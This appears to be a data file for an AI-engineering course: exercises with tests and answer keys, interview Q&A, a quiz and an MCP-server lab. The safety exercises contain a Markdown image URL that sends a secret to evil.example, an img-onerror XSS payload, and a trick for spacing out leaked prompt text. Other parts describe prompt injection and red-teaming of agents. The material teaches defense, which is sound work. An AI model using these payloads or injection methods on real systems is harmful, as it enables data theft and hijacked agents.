results = [{"type": "tool_result", "tool_use_id": "t1", "content": "Interview on Friday"}]
h = next_messages(first, response, results)
assert valid(h), "each tool_result must follow the assistant message with its tool_use"
assert h[0] == first[0] and h[1] == {"role": "assistant", "content": response["content"]} and h[2] == {"role": "user", "content": results}
assert len(first) == 1, "don't change the caller's list"`,
      solution: `def next_messages(messages, response, results):
    # response: the model's reply containing tool_use blocks
    # results: the tool_result blocks your code produced for them
    return messages + [{"role": "assistant", "content": response["content"]}, {"role": "user", "content": results}]`,
    }],
    agents: [{
      key: "detect-loop", prompt: "Write find_loop(trace, repeats): trace is the list of tool calls an agent made, each a (tool_name, args_dict) pair. Return the first call that happens repeats times in a row (same name and same arguments), or None if none does.",
      example: `find_loop([("search", {"q": "a"}), ("lookup", {"id": 1}), ("lookup", {"id": 1}), ("lookup", {"id": 1})], 3)\nreturns ("lookup", {"id": 1})`,
      hint: "Walk the trace keeping a run length: if a call equals the previous one, add 1, else reset to 1. Return the call when the run reaches repeats. Tuples of a string and a dict compare with == as you'd hope.",
      starter: `def find_loop(trace, repeats):
    pass
`,
      tests: `trace = [("search", {"q": "a"}), ("lookup", {"id": 1}), ("lookup", {"id": 1}), ("lookup", {"id": 1})]
assert find_loop(trace, 3) == ("lookup", {"id": 1})
assert find_loop(trace, 4) is None
assert find_loop([("a", {}), ("b", {}), ("a", {}), ("b", {})], 2) is None, "only calls in a row count"
assert find_loop([("lookup", {"id": 1}), ("lookup", {"id": 2})], 2) is None, "different arguments are a different call"
assert find_loop([], 2) is None`,
      solution: `def find_loop(trace, repeats):
    run = 0
    for i, call in enumerate(trace):
        run = run + 1 if i > 0 and call == trace[i - 1] else 1
        if run >= repeats:
            return call
    return None`,
    }, {
      key: "approval-gate", prompt: "Write run_with_approval(calls, tools, approve): calls is a list of (name, args) pairs; tools maps a name to {\"fn\", \"writes\"}. Read-only tools run straight away. For a tool that writes, call approve(name, args) first and run it only if that returns True. Return one record per call, in order: {\"tool\": name, \"status\": \"done\", \"result\": the return value} or {\"tool\": name, \"status\": \"denied\"}.",
      example: `run_with_approval([("list_apps", {}), ("delete_app", {"company": "Clio"})], tools, lambda name, args: False)\nreturns [{"tool": "list_apps", "status": "done", "result": [...]}, {"tool": "delete_app", "status": "denied"}]`,
      hint: "For each call: `tool = tools[name]`; if `tool[\"writes\"] and not approve(name, args)`, append the denied record and `continue`. Otherwise run `tool[\"fn\"](**args)`.",
      starter: `def run_with_approval(calls, tools, approve):
    pass
`,
      tests: `apps = ["Shopify", "Clio"]
def delete_app(company):
    apps.remove(company)
    return "deleted " + company
tools = {"list_apps": {"fn": lambda: list(apps), "writes": False}, "delete_app": {"fn": delete_app, "writes": True}}
asked = []
def deny(name, args):
    asked.append(name)
    return False
r = run_with_approval([("list_apps", {}), ("delete_app", {"company": "Clio"})], tools, deny)
assert r == [{"tool": "list_apps", "status": "done", "result": ["Shopify", "Clio"]}, {"tool": "delete_app", "status": "denied"}], r
assert apps == ["Shopify", "Clio"] and asked == ["delete_app"], "only writes ask, and a denial changes nothing"
r = run_with_approval([("delete_app", {"company": "Clio"})], tools, lambda name, args: True)
assert r == [{"tool": "delete_app", "status": "done", "result": "deleted Clio"}] and apps == ["Shopify"]`,
      solution: `def run_with_approval(calls, tools, approve):
    records = []
    for name, args in calls:
        tool = tools[name]
        if tool["writes"] and not approve(name, args):
            records.append({"tool": name, "status": "denied"})
            continue
        records.append({"tool": name, "status": "done", "result": tool["fn"](**args)})
    return records`,
    }, {
      key: "compact", prompt: "Long-running agents compact their memory. Write compact(messages, keep_last, summarize): messages[0] is the task and is always kept. If there are more than keep_last messages after it, replace the older ones with a single message {\"role\": \"user\", \"content\": \"Summary of earlier steps: \" + summarize(older)} and keep the last keep_last messages unchanged. Otherwise return the messages unchanged (as a new list).",
      example: "With a task and 5 later messages, keep_last=2:\nreturns [task, summary message, message 4, message 5]",
      hint: "`task, rest = messages[0], messages[1:]`. If `len(rest) <= keep_last`, return `list(messages)`. Otherwise split rest at `len(rest) - keep_last`.",
      starter: `def compact(messages, keep_last, summarize):
    pass
`,
      tests: `msgs = [{"role": "user", "content": "task"}] + [{"role": "assistant" if i % 2 else "user", "content": "m" + str(i)} for i in range(1, 6)]
seen = []
def summarize(older):
    seen.append([m["content"] for m in older])
    return str(len(older)) + " steps"
out = compact(msgs, 2, summarize)
assert out[0] == msgs[0], "the task is always kept"
assert out[1] == {"role": "user", "content": "Summary of earlier steps: 3 steps"}, out[1]
assert out[2:] == msgs[-2:] and len(out) == 4
assert seen == [["m1", "m2", "m3"]], "summarize gets only the older messages"
short = msgs[:3]
assert compact(short, 2, summarize) == short and len(seen) == 1, "nothing to compact, no summary call"`,
      solution: `def compact(messages, keep_last, summarize):
    task, rest = messages[0], messages[1:]
    if len(rest) <= keep_last:
        return list(messages)
    cut = len(rest) - keep_last
    summary = {"role": "user", "content": "Summary of earlier steps: " + summarize(rest[:cut])}
    return [task, summary] + rest[cut:]`,
    }, {
      key: "loop-debug", debug: true, prompt: "Live-debugging round: this agent never finishes when the user misspells a company name; it hits the step limit every time. Read the loop: when a tool raises, what does the model get to see? Fix run so the model learns about the failure and can correct itself.",
      example: `run(model, {"lookup": lookup}, "Status of my Shopfy application?") returns "Status: interview Friday"\n(the first lookup fails, the model sees the error and retries with "Shopify")`,
      hint: "Skipping a failed call means the next request is identical to the last one, so the model makes the same call again. Append a tool message with the error text instead (and mark it, e.g. `\"is_error\": True`).",
      starter: `def run(model, tools, task, max_steps=6):
    messages = [{"role": "user", "content": task}]
    for step in range(max_steps):
        reply = model(messages)
        if "answer" in reply:
            return reply["answer"]
        try:
            result = tools[reply["tool"]](**reply["input"])
        except Exception as e:
            continue
        messages.append({"role": "tool", "name": reply["tool"], "content": result})
    raise RuntimeError("agent did not finish in " + str(max_steps) + " steps")
`,
      tests: `def lookup(company):
    data = {"Shopify": "interview Friday"}
    if company not in data:
        raise ValueError("no application for " + company + "; known companies: " + ", ".join(data))
    return data[company]
def model(messages):
    last = messages[-1]
    if last["role"] == "user":
        return {"tool": "lookup", "input": {"company": "Shopfy"}}
    if last.get("is_error") or "known companies" in str(last["content"]):
        return {"tool": "lookup", "input": {"company": "Shopify"}}
    return {"answer": "Status: " + last["content"]}
assert run(model, {"lookup": lookup}, "Status of my Shopfy application?") == "Status: interview Friday"`,
      solution: `def run(model, tools, task, max_steps=6):
    messages = [{"role": "user", "content": task}]
    for step in range(max_steps):
        reply = model(messages)
        if "answer" in reply:
            return reply["answer"]
        try:
            result = tools[reply["tool"]](**reply["input"])
            messages.append({"role": "tool", "name": reply["tool"], "content": result})
        except Exception as e:
            messages.append({"role": "tool", "name": reply["tool"], "content": "error: " + str(e), "is_error": True})
    raise RuntimeError("agent did not finish in " + str(max_steps) + " steps")`,
    }],
    safety: [{
      key: "exfil-links", prompt: "A Markdown image like ![x](https://evil.example/log?d=SECRET) makes the browser send data to that server the moment it renders. Write unsafe_links(markdown, allowed): find every link or image target, the text between \"](\" and the next \")\", and return the targets whose domain isn't in the allowed set, in order. The domain is the part after \"://\" up to the next \"/\" (or the end), lowercased.",
      example: `unsafe_links("See [docs](https://docs.example.com/a) ![x](https://evil.example/log?d=123)", {"docs.example.com"})\nreturns ["https://evil.example/log?d=123"]`,
      hint: "Loop with `start = markdown.find(\"](\", pos)` until it returns -1; the target ends at `markdown.find(\")\", start)`. For the domain: `url.split(\"://\", 1)[-1].split(\"/\", 1)[0].lower()`.",
      starter: `def unsafe_links(markdown, allowed):
    pass
`,
      tests: `md = "See [docs](https://docs.example.com/a) and ![chart](https://evil.example/log?d=acct-123) and [home](HTTPS://Docs.Example.com)"
assert unsafe_links(md, {"docs.example.com"}) == ["https://evil.example/log?d=acct-123"], unsafe_links(md, {"docs.example.com"})
assert unsafe_links("no links here", {"a.com"}) == []
assert unsafe_links("[a](http://x.io) [b](http://y.io/p)", set()) == ["http://x.io", "http://y.io/p"], "with nothing allowed, every link is flagged"`,
      solution: `def unsafe_links(markdown, allowed):
    flagged = []
    pos = 0
    while True:
        start = markdown.find("](", pos)
        if start == -1:
            return flagged
        end = markdown.find(")", start)
        url = markdown[start + 2:end]
        domain = url.split("://", 1)[-1].split("/", 1)[0].lower()
        if domain not in allowed:
            flagged.append(url)
        pos = end`,
    }, {
      key: "canary", prompt: "Detect system prompt leaks with a canary: a random string placed in the system prompt that should never appear in output. Write leaked(output, canary) that returns True if the canary appears in the output, ignoring case and ignoring spaces and hyphens (attackers ask the model to space it out to slip past filters).",
      example: `leaked("Sure! My instructions say ZX-81-QQ ...", "zx81qq") returns True\nleaked("Here is your summary.", "zx81qq") returns False`,
      hint: "Clean both strings the same way: `.lower().replace(\" \", \"\").replace(\"-\", \"\")`, then use `in`.",
      starter: `def leaked(output, canary):
    pass
`,
      tests: `assert leaked("Sure! My instructions say ZX-81-QQ ...", "zx81qq") is True
assert leaked("z x 8 1 q q", "ZX81QQ") is True, "spaced out still counts"
assert leaked("Here is your summary.", "zx81qq") is False
assert leaked("", "zx81qq") is False`,
      solution: `def clean(s):
    return s.lower().replace(" ", "").replace("-", "")

def leaked(output, canary):
    return clean(canary) in clean(output)`,
    }, {
      key: "attack-rate", prompt: "Write attack_report(results) for a red-team run: results is a list of {\"category\", \"succeeded\"} dicts, one per attack. Return (overall, by_category): overall is the fraction of attacks that succeeded (0.0 for none), by_category maps each category, in order of first appearance, to its own success rate.",
      example: `attack_report([{"category": "injection", "succeeded": True}, {"category": "injection", "succeeded": False}, {"category": "pii", "succeeded": False}])\nreturns (0.333..., {"injection": 0.5, "pii": 0.0})`,
      hint: "Count totals and successes per category with two dicts in one loop; overall is total successes divided by `len(results)`.",
      starter: `def attack_report(results):
    pass
`,
      tests: `results = [{"category": "injection", "succeeded": True}, {"category": "injection", "succeeded": False},
           {"category": "pii", "succeeded": False}, {"category": "jailbreak", "succeeded": True}]
overall, by = attack_report(results)
assert overall == 0.5 and by == {"injection": 0.5, "pii": 0.0, "jailbreak": 1.0}, (overall, by)
assert list(by) == ["injection", "pii", "jailbreak"]
assert attack_report([]) == (0.0, {})`,
      solution: `def attack_report(results):
    totals, wins = {}, {}
    for r in results:
        c = r["category"]
        totals[c] = totals.get(c, 0) + 1
        wins[c] = wins.get(c, 0) + (1 if r["succeeded"] else 0)
    overall = sum(wins.values()) / len(results) if results else 0.0
    return overall, {c: wins[c] / totals[c] for c in totals}`,
    }, {
      key: "escape-debug", debug: true, prompt: "Improper output handling: render_answer puts the model's answer straight into a web page. A poisoned document got the model to output an <img onerror=...> tag, and it ran as code in users' browsers. Fix render_answer so the answer is shown as text: escape &, <, >, and quotes.",
      example: `render_answer("<b>Hi</b> & bye") returns\n'<div class="answer">&lt;b&gt;Hi&lt;/b&gt; &amp; bye</div>'`,
      hint: "Python's standard library does this: `import html` and `html.escape(text)` escapes & first (so nothing is escaped twice), then < > \" and '.",
      starter: `def render_answer(text):
    return '<div class="answer">' + text + '</div>'
`,
      tests: `out = render_answer('<img src=x onerror="alert(1)">')
assert "<img" not in out, "model output must not become HTML"
assert render_answer("<b>Hi</b> & bye") == '<div class="answer">&lt;b&gt;Hi&lt;/b&gt; &amp; bye</div>', render_answer("<b>Hi</b> & bye")
assert render_answer("Plain answer.") == '<div class="answer">Plain answer.</div>'`,
      solution: `import html

def render_answer(text):
    return '<div class="answer">' + html.escape(text) + '</div>'`,
    }],
  },
  questions: [
    { id: "q147", topic: "tools", q: "How do you handle a tool that fails or times out inside the loop?", a: "Catch it, and return a tool_result marked as an error with a message the model can act on ('no application for Shopfy; known companies: Shopify, Clio'), so it can correct itself or tell the user. Put timeouts on every tool, retry transient failures inside the tool, make write tools idempotent so retries are safe, and cap total steps so a broken tool can't loop forever." },
    { id: "q148", topic: "agents", q: "An agent in production sometimes runs until it hits the step limit. How do you debug it?", a: "Pull the traces of those runs and read them step by step. Look for the same call repeated (an error the model never saw, or a vague error it can't act on), a missing tool, results that are too long or truncated, or an unclear stop condition. Fix the cause, add loop detection and per-task budgets, and add the traces to the eval set as regression cases." },
    { id: "q149", topic: "agents", q: "When would you use subagents?", a: "When a task splits into self-contained pieces that would clutter the main context, such as researching several sources or reviewing many files: each subagent gets a clean context and only the tools it needs, and returns a short summary, possibly in parallel. Avoid them for small or tightly coupled tasks: they multiply tokens and lose shared context." },
    { id: "q150", topic: "mcp", q: "What is MCP, and how is it different from plain function calling?", a: "Function calling is the model-side mechanism: the model asks your code to run a tool you defined in that app. MCP is a protocol for packaging tools, resources and prompts as a server that any MCP-capable host can discover and call over JSON-RPC (stdio locally, HTTP remotely). You write the integration once and reuse it across apps; the host still uses function calling under the hood." },
    { id: "q151", topic: "mcp", q: "What are the security risks of connecting an agent to MCP servers?", a: "A server runs with the permissions you give it, and its tool descriptions and results go straight into the model's context, so a malicious or compromised server can inject instructions or exfiltrate data. Mitigate with trusted, pinned servers, least-privilege credentials per server, human approval for write tools, allowlisted network destinations, auth on remote servers, and logging every call." },
    { id: "q152", topic: "mcp", q: "When would you write a skill instead of an MCP server?", a: "A skill packages knowledge and procedure: instructions, examples, scripts for a recurring task (release notes, a team's SQL conventions). An MCP server gives access to a system: live data and actions. If the agent needs to reach something, build a server; if it needs to know how your team does something, write a skill, often one that explains how to use the server's tools." },
    { id: "q153", topic: "safety", q: "What's the difference between a jailbreak and prompt injection?", a: "A jailbreak is the user trying to get the model to break its own safety rules, for example through role-play or encodings. Prompt injection is someone else's text, in a document, email or tool result, taking over your application's instructions. Injection is the bigger risk for apps with tools because the attacker isn't the user and can trigger real actions." },
    { id: "q154", topic: "safety", q: "How would you red-team an LLM feature before launch?", a: "List what could go wrong for this feature (data leaks, harmful advice, injected actions, cost blow-ups), write attacks for each category including indirect injection through retrieved content, run them and measure attack success rate per category, fix the worst with layered defences, and keep the set as a regression eval that runs on every prompt, model or tool change." },
  ],
  quiz: [
    { id: "x107", tags: [], topic: "mcp", q: "MCP messages are encoded as:", options: ["GraphQL queries", "JSON-RPC 2.0", "Protocol Buffers", "Plain text commands"], answer: 1, why: "MCP uses JSON-RPC 2.0 requests, responses and notifications." },
    { id: "x108", tags: [], topic: "mcp", q: "A stdio MCP server should write its logs to:", options: ["Standard output", "Standard error", "The tool result", "Nowhere: stdio servers can't log"], answer: 1, why: "Standard output carries the protocol, so anything else printed there corrupts it." },
    { id: "x109", tags: [], topic: "safety", q: "Giving an agent's tools more permissions than the task needs is which OWASP LLM risk?", options: ["Misinformation", "Excessive agency", "Supply chain", "Data poisoning"], answer: 1, why: "Excessive agency: too much functionality, permission or autonomy." },
    { id: "x110", tags: [], topic: "agents", q: "An agent keeps calling the same failing tool. The most likely cause is:", options: ["Temperature too low", "The tool's error never reaches the model, or doesn't say what to do", "Too few tools", "The context window is too big"], answer: 1, why: "Without an actionable error in the history, the model's next request looks the same, so it repeats the call." },
  ],
  labs: [{
    id: "mcpskill", title: "MCP server and skill for your agent's tools", level: "Intermediate", time: "6-8 hours", stack: ["Python", "MCP Python SDK", "Claude Code or another MCP host"],
    goal: "Expose your tool-using assistant's tools as an MCP server that any MCP host can use, package a skill that teaches agents to use them well, and red-team the result.",
    before: [
      "**Cost:** the server itself is free to run; the model calls made by the host app cost cents to a couple of dollars while testing.",
      "**Set a spending limit** on the model account the host uses.",
      "**Keep keys out of code and git:** the server reads its own credentials from environment variables, never from tool descriptions or arguments.",
      "**Free alternative:** test every tool by hand in the MCP Inspector without any model, or use a local model host that supports MCP.",
    ],
    steps: [
      { do: "Install the SDK (`pip install \"mcp[cli]\"`) and wrap 3-4 tools from your agent project with FastMCP, with type hints and docstrings written for the model",
        see: "`python server.py` starts and waits quietly for input.",
        hint: "The code sample in MCP servers and Skills is the skeleton. Reuse your agent's functions rather than rewriting them." },
      { do: "Test it without a model in the MCP Inspector (`mcp dev server.py`)",
        see: "tools/list shows every tool with a clear description; tools/call works; a bad argument comes back as an error result (isError) instead of crashing the server.",
        hint: "Your `handle` exercise shows what the Inspector is sending and receiving." },
      { do: "Connect it to a host (Claude Code: `claude mcp add applications -- python server.py`) and use it in a conversation",
        see: "Asking \"what's pending with my applications?\" makes the assistant call your tools and answer from their results.",
        hint: "If the host can't connect, check that nothing but protocol messages goes to standard output (the stdio debug exercise)." },
      { do: "Harden it: logs on standard error, input validation, least privilege (a read-only database user for read tools), and write tools that require approval in the host",
        see: "A write action asks for confirmation, and a read tool can't modify data even if asked to.",
        hint: "Two database connections, one read-only, is a simple way to enforce least privilege." },
      { do: "Write a skill: a folder with SKILL.md (a name, a description saying what it does and when to use it, and instructions for using your tools and formatting results) plus one reference file",
        see: "In a fresh session, a matching request loads the skill and the agent follows it; an unrelated request doesn't load it.",
        hint: "The description decides when the skill loads (your `matching_skills` exercise): name the task and the trigger words people actually use." },
      { do: "Red-team it: 10 attacks, including an injected instruction inside data a tool returns, a request to delete everything, and an attempt to read the server's environment variables",
        see: "A table of attacks with succeeded or failed and an attack success rate; re-run after each fix.",
        hint: "Your `attack_report` exercise computes the rates by category." },
      { do: "README: setup for two hosts, a table of tools, the security design and the red-team results",
        see: "Someone else can install and use your server in five minutes and see how you secured it.",
        hint: "Include a short screen recording of the host using your tools." },
    ],
    resume: "Built an MCP server exposing typed tools over a SQLite application tracker, with least-privilege access and approval for writes, plus a reusable agent skill; red-teamed it with injection and over-permission attacks and documented the results.",
    cost: "Free to run the server; the host's model calls cost cents to a few dollars during testing.",
    stretch: ["Serve it over Streamable HTTP with authentication", "Add an MCP resource that exposes your database schema", "Share the skill in a repository your teammates can install from"],
  }],
  glossary: [
    ["Canary token", "A unique random string placed in a prompt or document; seeing it in output or logs shows a leak."],
    ["Compaction", "Replacing older conversation turns with a summary so a long-running agent stays within its context window."],
    ["Excessive agency", "Giving an AI system more tools, permissions or autonomy than its task needs (an OWASP LLM risk)."],
    ["JSON-RPC", "A small standard for calling functions with JSON messages: requests with an id and method, responses with a result or error."],
    ["MCP host / client / server", "The host is the AI app, its MCP client speaks the protocol, and a server exposes tools, resources and prompts."],
    ["Progressive disclosure", "Loading only a skill's name and description up front, and its full instructions only when a task needs them."],
    ["Red-teaming", "Attacking your own AI system with adversarial inputs to find failures before attackers or users do."],
    ["Skill", "A folder with a SKILL.md (name, description, instructions) and optional files that an agent loads when a task matches."],
    ["Subagent", "A separate agent with its own context and tools that handles a self-contained subtask and reports back."],
  ],
});

// ---------------- Modules 15-17: evals II & LLMOps, models you run and adapt, getting hired ----------------
extendTrack(AI, {
  topics: [
    {
      id: "evalsci", title: "Evals in production: judges, CI gates and A/B tests", short: "Eval2",
      why: "\"How do you know your judge is reliable?\" and \"how would you know the new model is better for users?\" are standard interview questions. These tools answer both, and they're what stops quality silently slipping after launch.",
      body: `<p><button class="link-btn inline-link" data-trgo="ai|learn|evals">Evals &amp; testing</button> built a golden set, code graders and error analysis. Running an LLM feature for real adds three things: graders for what code can't check, evals that run on every change, and measurement on live traffic.</p>
        <h3>LLM-as-judge, done carefully</h3>
        <p>Use a judge model for qualities code can't check: faithfulness to sources, tone, whether the question was answered. Write <b>one judge per criterion</b> with a binary verdict and a one-line reason, and give it the rubric and the sources. Judges have known biases: <b>position bias</b> (preferring whichever answer comes first in a comparison), <b>verbosity bias</b> (preferring longer answers) and <b>self-preference</b> (preferring text from their own model family). Counter them by judging both orders in pairwise comparisons, keeping criteria binary, and using a different model family as the judge where you can.</p>
        <h3>Calibrating a judge</h3>
        <p>Hand-label 50-100 outputs yourself first, then run the judge on them. Raw agreement can mislead when most outputs pass (a judge that always says "pass" agrees 90% of the time if 90% pass), so also check how many of your failures it catches and how many of your passes it keeps, plus <b>Cohen's kappa</b>: agreement corrected for the agreement you'd get by chance (1 is perfect, 0 is no better than chance). Tune the judge prompt on part of the labels and report its numbers on the rest.</p>
        <h3>Evals in CI</h3>
        <p>Run a small, fast <b>smoke set</b> on every pull request and the full set nightly. Compare against the <b>baseline</b> from the main branch rather than a fixed number, fail the check if the pass rate drops by more than a set tolerance or if any <b>must-pass</b> case (safety, legal) fails, and report cost and latency next to quality.</p>
        <h3>Online evals and A/B tests</h3>
        <p>In production, sample real traffic and run judges on it in the background, and collect user signals: thumbs up or down, but also implicit ones such as retries, edits to the AI's draft and escalations to a person. To compare two versions, run an <b>A/B test</b>: randomly send a share of users to the new version, choose one primary metric in advance (such as task success rate), decide the sample size up front, and check the difference is <b>statistically significant</b> (unlikely to be chance; a two-proportion z-test with |z| of 1.96 or more is the usual 95% bar) before rolling out. Watch guardrail metrics (cost, latency, complaints) too. A <b>shadow test</b> runs the new version on real traffic without showing users its answers, for an offline comparison first.</p>`,
      example: `human = [True, True, True, False, True, False, True, True, True, True]   # your labels: pass?
judge = [True, True, True, True,  True, False, True, True, True, True]   # the judge's verdicts

agree = sum(h == j for h, j in zip(human, judge)) / len(human)
human_fails = [j for h, j in zip(human, judge) if not h]
print("agreement:", agree)                                     # 0.9 looks good...
print("failures caught:", human_fails.count(False), "of", len(human_fails))   # ...but it missed one of two

pa, pb = sum(human) / 10, sum(judge) / 10
chance = pa * pb + (1 - pa) * (1 - pb)
print("kappa:", round((agree - chance) / (1 - chance), 2))   # well below agreement
`,
      exercises: [{
        key: "judge-agreement", prompt: "Write judge_stats(human, judge): two equal-length lists of booleans (True = pass), your labels and the judge's verdicts. Return a dict with \"agreement\" (fraction of cases where they match), \"catches_failures\" (of the cases you marked False, the fraction the judge also marked False) and \"keeps_passes\" (of your True cases, the fraction the judge marked True). Use 0.0 when a group is empty.",
        example: "judge_stats([True, False, False, True], [True, True, False, True]) returns\n{\"agreement\": 0.75, \"catches_failures\": 0.5, \"keeps_passes\": 1.0}",
        hint: "Count four things in one zip loop: matches, human fails, fails the judge also failed, human passes the judge also passed. Guard each division.",
        starter: `def judge_stats(human, judge):
    pass
`,
        tests: `assert judge_stats([True, False, False, True], [True, True, False, True]) == {"agreement": 0.75, "catches_failures": 0.5, "keeps_passes": 1.0}
r = judge_stats([True] * 9 + [False], [True] * 10)
assert r["agreement"] == 0.9 and r["catches_failures"] == 0.0, "an always-pass judge agrees 90% and catches nothing"
assert judge_stats([True], [True]) == {"agreement": 1.0, "catches_failures": 0.0, "keeps_passes": 1.0}
assert judge_stats([], []) == {"agreement": 0.0, "catches_failures": 0.0, "keeps_passes": 0.0}`,
        solution: `def judge_stats(human, judge):
    match = fails = caught = passes = kept = 0
    for h, j in zip(human, judge):
        match = match + (1 if h == j else 0)
        if h:
            passes = passes + 1
            kept = kept + (1 if j else 0)
        else:
            fails = fails + 1
            caught = caught + (0 if j else 1)
    return {"agreement": match / len(human) if human else 0.0,
            "catches_failures": caught / fails if fails else 0.0,
            "keeps_passes": kept / passes if passes else 0.0}`,
      }, {
        key: "kappa", prompt: "Write cohens_kappa(a, b) for two equal-length lists of booleans. Observed agreement po is the fraction of matching positions. Chance agreement pe = (share of True in a × share of True in b) + (share of False in a × share of False in b). Return (po - pe) / (1 - pe), or 1.0 when pe is 1.",
        example: "cohens_kappa([True, True, False, False], [True, False, False, False]) returns 0.5",
        hint: "`ta = sum(a) / len(a)` works because True counts as 1. Then `pe = ta * tb + (1 - ta) * (1 - tb)`.",
        starter: `def cohens_kappa(a, b):
    pass
`,
        tests: `assert abs(cohens_kappa([True, True, False, False], [True, False, False, False]) - 0.5) < 1e-9
assert cohens_kappa([True, False, True, False], [True, False, True, False]) == 1.0
assert abs(cohens_kappa([True, False], [False, True]) + 1) < 1e-9, "complete disagreement is -1 here"
assert cohens_kappa([True, True], [True, True]) == 1.0, "everyone always agrees: pe is 1"`,
        solution: `def cohens_kappa(a, b):
    po = sum(1 for x, y in zip(a, b) if x == y) / len(a)
    ta, tb = sum(a) / len(a), sum(b) / len(b)
    pe = ta * tb + (1 - ta) * (1 - tb)
    if pe == 1:
        return 1.0
    return (po - pe) / (1 - pe)`,
      }, {
        key: "ci-gate", prompt: "Write ci_gate(baseline, current, tolerance, must_pass): baseline and current map case ids to True (pass) or False, for the main branch and the pull request. Return (ok, reasons). Add the reason \"pass rate dropped from X to Y\" (rates rounded to 2 places) if current's pass rate is more than tolerance below baseline's, and \"must-pass case failed: ID\" for each id in must_pass that fails in current. ok is True when there are no reasons.",
        example: `ci_gate({"c1": True, "c2": True}, {"c1": True, "c2": False}, 0.1, ["c1"])\nreturns (False, ["pass rate dropped from 1.0 to 0.5"])`,
        hint: "Pass rate: `sum(d.values()) / len(d)`. Compare `current_rate < base_rate - tolerance`. Use `str(round(rate, 2))` in the message.",
        starter: `def ci_gate(baseline, current, tolerance, must_pass):
    pass
`,
        tests: `assert ci_gate({"c1": True, "c2": True}, {"c1": True, "c2": False}, 0.1, ["c1"]) == (False, ["pass rate dropped from 1.0 to 0.5"])
base = {"c" + str(i): True for i in range(10)}
cur = dict(base, c3=False)
assert ci_gate(base, cur, 0.15, []) == (True, []), "a drop within tolerance passes"
assert ci_gate(base, cur, 0.15, ["c3"]) == (False, ["must-pass case failed: c3"]), "a safety case fails no matter the average"
assert ci_gate(base, base, 0.0, ["c1"]) == (True, [])`,
        solution: `def ci_gate(baseline, current, tolerance, must_pass):
    reasons = []
    base_rate = sum(baseline.values()) / len(baseline)
    cur_rate = sum(current.values()) / len(current)
    if cur_rate < base_rate - tolerance:
        reasons.append("pass rate dropped from " + str(round(base_rate, 2)) + " to " + str(round(cur_rate, 2)))
    for case in must_pass:
        if not current.get(case, False):
            reasons.append("must-pass case failed: " + case)
    return (not reasons, reasons)`,
      }, {
        key: "ab-test", prompt: "Write ab_result(success_a, n_a, success_b, n_b) for an A/B test with a two-proportion z-test. Rates pa = success_a / n_a and pb = success_b / n_b; pooled p = (success_a + success_b) / (n_a + n_b); standard error se = sqrt(p × (1 - p) × (1 / n_a + 1 / n_b)); z = (pb - pa) / se. Return {\"lift\": pb - pa, \"z\": z, \"significant\": abs(z) >= 1.96}.",
        example: "ab_result(400, 1000, 460, 1000) returns {\"lift\": 0.06, \"z\": 2.709..., \"significant\": True}",
        hint: "`import math` and `math.sqrt`. Calculate in the order the prompt gives; compare with `abs(z) >= 1.96`.",
        starter: `import math

def ab_result(success_a, n_a, success_b, n_b):
    pass
`,
        tests: `r = ab_result(400, 1000, 460, 1000)
assert abs(r["lift"] - 0.06) < 1e-9 and abs(r["z"] - 2.7100) < 1e-3 and r["significant"] is True, r
r = ab_result(40, 100, 46, 100)
assert abs(r["lift"] - 0.06) < 1e-9 and r["significant"] is False, "the same lift on 100 users each could easily be chance"
assert ab_result(50, 100, 45, 100)["z"] < 0, "B worse than A gives a negative z"`,
        solution: `import math

def ab_result(success_a, n_a, success_b, n_b):
    pa, pb = success_a / n_a, success_b / n_b
    p = (success_a + success_b) / (n_a + n_b)
    se = math.sqrt(p * (1 - p) * (1 / n_a + 1 / n_b))
    z = (pb - pa) / se
    return {"lift": pb - pa, "z": z, "significant": abs(z) >= 1.96}`,
      }, {
        key: "position-bias", debug: true, prompt: "A pairwise judge picks answer A over B in 85% of comparisons, even when A and B are swapped in the data. It has position bias: it prefers whichever answer it sees first. Fix compare so it asks the judge twice, once in each order, returns \"a\" or \"b\" only when both verdicts agree, and \"tie\" otherwise.",
        example: `With a judge that always answers "first": compare(judge, q, a, b) returns "tie"\nWith a judge that really prefers b: compare(judge, q, a, b) returns "b"`,
        hint: "`first = judge(question, a, b)` and `swapped = judge(question, b, a)`. A wins when first is \"first\" and swapped is \"second\".",
        starter: `def compare(judge, question, a, b):
    # judge(question, x, y) returns "first" if it prefers x, "second" if it prefers y
    return "a" if judge(question, a, b) == "first" else "b"
`,
        tests: `always_first = lambda q, x, y: "first"
assert compare(always_first, "Capital of Canada?", "Toronto", "Ottawa") == "tie", "a judge that only likes position one decides nothing"
prefers_ottawa = lambda q, x, y: "first" if "Ottawa" in x else "second"
assert compare(prefers_ottawa, "Capital of Canada?", "Toronto", "Ottawa") == "b"
assert compare(prefers_ottawa, "Capital of Canada?", "Ottawa", "Toronto") == "a"`,
        solution: `def compare(judge, question, a, b):
    # judge(question, x, y) returns "first" if it prefers x, "second" if it prefers y
    first = judge(question, a, b)
    swapped = judge(question, b, a)
    if first == "first" and swapped == "second":
        return "a"
    if first == "second" and swapped == "first":
        return "b"
    return "tie"`,
      }],
      cards: [
        ["Why isn't raw agreement enough to trust a judge?", "If most outputs pass, a judge that always says pass agrees most of the time while catching no failures. Check failures caught and kappa too."],
        ["Smoke set vs full eval set in CI?", "A small, fast smoke set runs on every pull request; the full set runs nightly or before release, to balance cost and speed with coverage."],
        ["What makes an A/B test result trustworthy?", "Random assignment, one primary metric and sample size chosen in advance, a significance check instead of peeking, and guardrail metrics for cost, latency and complaints."],
      ],
      videos: [IBM("trfUBIDeI1Y", "LLM as a Judge: Scaling AI Evaluation Strategies")],
    },
    {
      id: "localmodels", title: "Running models locally", short: "Local",
      why: "Teams run models themselves when data can't leave the network, when volume makes APIs expensive, or to work offline, and a local model is the free option for every project in this course. Memory and speed estimates are standard interview arithmetic.",
      body: `<p>An <b>open-weight model</b> is one whose trained parameters you can download and run yourself (families such as Llama, Qwen, Mistral and Gemma). You can run small ones on a laptop, bigger ones on a workstation GPU, and serve them to a team from your own servers.</p>
        <h3>The tools</h3>
        <ul><li><b>Ollama:</b> the easiest start. <code>ollama pull llama3.2</code> downloads a model, <code>ollama run llama3.2</code> chats with it, and it serves an API on your machine at <code>http://localhost:11434</code>.</li>
        <li><b>llama.cpp:</b> the efficient C++ engine under many local tools; runs on CPUs, GPUs and Apple silicon, and its <code>llama-server</code> exposes an API.</li>
        <li><b>LM Studio:</b> a desktop app for downloading and chatting with models.</li>
        <li><b>vLLM:</b> a high-throughput GPU server for production traffic; see <button class="link-btn inline-link" data-trgo="roles|learn|selfhost">Self-hosting &amp; serving models</button>.</li></ul>
        <h3>Quantization and memory</h3>
